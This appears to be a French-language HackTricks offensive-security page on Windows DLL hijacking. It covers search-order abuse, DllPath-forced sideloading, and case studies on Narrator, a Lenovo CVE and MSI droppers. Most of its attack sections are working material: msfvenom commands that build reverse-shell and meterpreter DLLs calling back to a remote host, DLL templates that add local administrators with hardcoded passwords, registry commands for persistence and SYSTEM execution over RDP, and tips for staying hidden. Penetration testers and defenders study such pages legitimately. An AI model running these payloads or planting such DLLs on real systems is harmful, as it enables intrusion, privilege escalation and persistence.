# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme **DLL Spoofing, Injection, and Side-Loading**. Il est principalement utilisé pour l'exécution de code, l'obtention de persistance et, moins couramment, l'escalade de privilèges. Malgré l'accent mis ici sur l'escalade, la méthode de hijacking reste la même selon l'objectif.

### Techniques courantes

Plusieurs méthodes sont employées pour le DLL hijacking, chacune avec son efficacité en fonction de la stratégie de chargement des DLL de l'application :

1. **DLL Replacement** : Remplacer une DLL légitime par une DLL malveillante, éventuellement en utilisant DLL Proxying pour préserver la fonctionnalité de la DLL originale.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche situé avant le chemin de la DLL légitime, en exploitant le schéma de recherche de l'application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante qu'une application va charger en pensant qu'il s'agit d'une DLL requise mais inexistante.
4. **DLL Redirection** : Modifier les paramètres de recherche comme %PATH% ou les fichiers .exe.manifest / .exe.local pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Substituer la DLL légitime par une version malveillante dans le répertoire WinSxS, méthode souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, ressemblant aux techniques de Binary Proxy Execution.

## Finding missing Dlls

La manière la plus courante de trouver des Dlls manquantes sur un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **configurant** les **2 filtres suivants** :

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

et afficher simplement **l'Activité du système de fichiers** :

![](<../../../images/image (153).png>)

Si vous cherchez des **dlls manquantes en général**, laissez ceci tourner pendant quelques **secondes**.\
Si vous recherchez une **dll manquante dans un exécutable spécifique**, vous devriez ajouter **un autre filtre comme "Process Name" "contains" `<exec name>`, exécuter celui-ci, et arrêter la capture d'événements**.

## Exploiting Missing Dlls

Pour escalader les privilèges, la meilleure chance est de pouvoir **écrire une dll que un processus privilégié tentera de charger** dans certains **emplacements où elle sera recherchée**. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la **dll est recherchée avant** le dossier contenant la **dll originale** (cas particulier), ou nous pourrons **écrire dans un dossier où la dll est recherchée** et où la dll originale n'existe **dans aucun dossier**.

### Dll Search Order

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les Dlls sont chargées précisément.**

Les applications Windows recherchent les DLLs en suivant un ensemble de **chemins de recherche prédéfinis**, respectant une séquence particulière. Le problème du DLL hijacking survient lorsqu'une DLL malveillante est placée de manière stratégique dans l'un de ces répertoires, garantissant qu'elle sera chargée avant la DLL authentique. Une solution pour prévenir cela est de s'assurer que l'application utilise des chemins absolus lorsqu'elle référence les DLLs dont elle a besoin.

Vous pouvez voir l'**ordre de recherche des DLL sur les systèmes 32-bit** ci-dessous :

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ceci est l'ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant grimpe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (par défaut activé).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**une dll peut être chargée en indiquant le chemin absolu plutôt que seulement le nom**. Dans ce cas cette dll **ne sera recherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si elles avaient été chargées par nom).

Il existe d'autres manières d'altérer l'ordre de recherche mais je ne vais pas les expliquer ici.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une manière avancée d'influencer de façon déterministe le chemin de recherche des DLL d'un processus nouvellement créé est de définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les APIs natives de ntdll. En fournissant un répertoire contrôlé par l'attaquant ici, un processus cible qui résout une DLL importée par nom (pas de chemin absolu et sans utiliser les drapeaux de chargement sécurisé) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Construire les paramètres du processus avec RtlCreateProcessParametersEx et fournir un DllPath personnalisé qui pointe vers votre dossier contrôlé (par ex., le répertoire où vit votre dropper/unpacker).
- Créer le processus avec RtlCreateUserProcess. Quand le binaire cible résout une DLL par nom, le loader consultera ce DllPath fourni pendant la résolution, permettant un sideloading fiable même si la DLL malveillante n'est pas colocée avec l'EXE cible.

Notes/limitations
- Cela affecte le processus enfant créé ; c'est différent de SetDllDirectory, qui n'affecte que le processus courant.
- La cible doit importer ou appeler LoadLibrary sur une DLL par nom (pas de chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs et les chemins absolus codés en dur ne peuvent pas être hijackés. Les exports forwardés et SxS peuvent modifier la préséance.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Exemple C complet : forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d'utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou faisant office de proxy vers le vrai) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci‑dessous. Le loader résout l'import via le DllPath fourni et sideloads votre DLL.

Cette technique a été observée in‑the‑wild pour orchestrer des chaînes de sideloading multi‑étapes : un lanceur initial dépose un DLL d'aide, qui ensuite invoque un binaire signée par Microsoft, susceptible d'être détourné, avec un DllPath personnalisé pour forcer le chargement du DLL de l'attaquant depuis un répertoire de staging.


#### Exceptions on dll search order from Windows docs

Certaines exceptions à l'ordre standard de recherche des DLL sont notées dans la documentation Windows :

- Lorsqu'une **DLL qui partage son nom avec une autre déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et de manifest avant de revenir à la DLL déjà présente en mémoire. **Dans ce scénario, le système n'effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **Known DLL** pour la version courante de Windows, le système utilisera sa version de la Known DLL, ainsi que toutes ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces Known DLLs.
- Si une **DLL possède des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles étaient indiquées uniquement par leurs **noms de module**, indépendamment du fait que la DLL initiale ait été identifiée via un chemin complet.

### Élévation de privilèges

**Exigences**:

- Identifier un processus qui s'exécute ou s'exécutera avec des **privileges différents** (horizontal or lateral movement), et qui **lui manque une DLL**.
- S'assurer qu'un **accès en écriture** est disponible pour n'importe quel **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l'exécutable ou un répertoire présent dans le system path.

Oui, les prérequis sont compliqués à trouver car **par défaut il est assez rare de trouver un exécutable privilégié sans DLL** et il est encore **plus rare d'avoir des permissions en écriture sur un dossier du system path** (vous ne pouvez pas par défaut). Mais, dans des environnements mal configurés, cela est possible.  
Si vous avez la chance de réunir les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si **l'objectif principal du projet est de bypass UAC**, vous y trouverez peut‑être un **PoC** d'un Dll hijaking pour la version de Windows qui vous intéresse et que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des permissions en écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifier les permissions de tous les répertoires dans PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d'un exécutable et les exports d'une dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la façon d'**abuser de Dll Hijacking pour escalader des privilèges** lorsque vous avez la permission d'écrire dans un **dossier du PATH système**, consultez :

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture sur un dossier à l'intérieur du PATH système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès est de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera depuis elle**. Quoi qu'il en soit, notez que Dll Hijacking s'avère utile pour [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une DLL valide** dans cette étude sur dll hijacking axée sur le détournement de DLL pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante** vous trouverez quelques **codes dll basiques** qui peuvent être utiles comme **modèles** ou pour créer une **dll exportant des fonctions non requises**.

## **Créer et compiler des Dlls**

### **Dll Proxifying**

Fondamentalement, un **Dll proxy** est une Dll capable d'**exécuter votre code malveillant lors du chargement** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels vers la bibliothèque réelle**.

Avec l'outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) vous pouvez réellement **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxify et **générer une proxified dll** ou **indiquer la Dll** et **générer une proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n'ai pas vu de version x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que, dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime ; si ces fonctions n'existent pas, le **binary ne pourra pas les charger** et l'**exploit échouera**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d'utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternative avec point d'entrée via thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe recherche toujours, au démarrage, une DLL de localisation prévisible et spécifique à la langue qui peut être hijacked pour arbitrary code execution et persistence.

Faits clés
- Chemin sondé (builds actuels) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin legacy (builds plus anciens) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par un attaquant et modifiable existe au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s'exécute. Aucune export n'est requise.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci‑dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un hijack naïf va parler/surligner l'UI. Pour rester discret, lors de l'attach énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et `SuspendThread` ; continuez dans votre propre thread. Voir PoC pour le code complet.

Trigger and persistence via Accessibility configuration
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, démarrer Narrator charge la DLL plantée. Sur le secure desktop (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Autoriser le classic RDP security layer : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP vers l'hôte, à l'écran de connexion appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s'exécute en tant que SYSTEM sur le secure desktop.
- L'exécution s'arrête lorsque la session RDP se ferme — injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d'un Accessibility Tool intégré (AT) (par ex., CursorIndicator), la modifier pour qu'elle pointe vers un binaire/DLL arbitraire, l'importer, puis définir `configuration` sur ce nom d'AT. Cela proxifie l'exécution arbitraire via le framework Accessibility.

Notes
- Écrire sous `%windir%\System32` et modifier des valeurs HKLM requiert des droits admin.
- Toute la logique du payload peut vivre dans `DLL_PROCESS_ATTACH` ; aucun export n'est nécessaire.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ce cas démontre **Phantom DLL Hijacking** dans le TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), suivi comme **CVE-2025-1729**.

### Vulnerability Details

- **Composant** : `TPQMAssistant.exe` situé à `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s'exécute quotidiennement à 09:30 sous le contexte de l'utilisateur connecté.
- **Directory Permissions** : Inscritible par `CREATOR OWNER`, permettant aux utilisateurs locaux de déposer des fichiers arbitraires.
- **DLL Search Behavior** : Tente de charger `hostfxr.dll` depuis son répertoire de travail en premier et logge "NAME NOT FOUND" si absent, indiquant la priorité de recherche dans le répertoire local.

### Exploit Implementation

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire, exploitant la DLL manquante pour obtenir de l'exécution de code sous le contexte de l'utilisateur :
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flux d'attaque

1. En tant qu'utilisateur standard, déposer `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendre que la tâche planifiée s'exécute à 9h30 dans le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec un niveau d'intégrité moyen.
4. Enchaîner des techniques standard de contournement UAC pour passer d'un niveau d'intégrité moyen à des privilèges SYSTEM.

## Étude de cas: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les acteurs de menace associent fréquemment des droppers basés sur MSI avec DLL side-loading pour exécuter des payloads sous un processus signé et de confiance.

Aperçu de la chaîne
- L'utilisateur télécharge un MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (p. ex., LaunchApplication ou une action VBScript), reconstruisant l'étape suivante à partir de ressources embarquées.
- Le dropper écrit un EXE légitime signé et une DLL malveillante dans le même répertoire (exemple de paire : Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Lorsque l'EXE signé est lancé, l'ordre de recherche des DLL de Windows charge wsc.dll depuis le répertoire de travail en premier, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

Analyse MSI (ce qu'il faut rechercher)
- CustomAction table:
- Chercher des entrées qui exécutent des exécutables ou du VBScript. Exemple de modèle suspect : LaunchApplication exécutant un fichier embarqué en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspecter les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés/fragmentés dans le CAB MSI :
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Rechercher plusieurs petits fragments qui sont concaténés et décryptés par une CustomAction VBScript. Flux commun :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Placez ces deux fichiers dans le même dossier :
- wsc_proxy.exe: hôte signé légitime (Avast). Le processus tente de charger wsc.dll par nom depuis son répertoire.
- wsc.dll: attacker DLL. Si aucun exports spécifiques ne sont requis, DllMain peut suffire ; sinon, construisez un proxy DLL et redirigez les exports requis vers la genuine library tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'export, utilisez un framework de proxying (par ex., DLLirant/Spartacus) pour générer une forwarding DLL qui exécute également votre payload.

- Cette technique repose sur la résolution des noms de DLL par le binaire de l'hôte. Si le binaire hôte utilise des chemins absolus ou des flags de chargement sécurisés (par ex., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du binaire hôte et de l'ensemble des exports.

## Références

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
